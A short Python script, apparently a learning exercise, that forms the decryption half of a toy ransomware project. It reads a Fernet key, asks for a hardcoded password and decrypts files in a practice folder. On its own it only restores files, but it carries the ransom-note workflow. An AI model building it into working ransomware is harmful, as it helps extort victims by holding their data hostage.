import os
from cryptography.fernet import Fernet



decryption_password = "letthedogout"

files = []
for file in os.listdir(r"C:\Users\jonat\Desktop\Python_practice\Malware"):
    if file == "ransomware_encrypt.py" or file == "thekey.key" or file == "ransomware_decrypt.py":# or file == "INSTRUCTIONS.TXT":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open(r"C:\Users\jonat\Desktop\Python_practice\Malware\key.key", "rb") as key:
    secretkey = key.read()

password_attempt = input("Enter password to restore your files:\n")
    
if password_attempt == decryption_password:
    
    for file in files:
        try:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)
        except Exception:
            pass

else:
    print("You Have Exceeded Your Password Attempts.")
        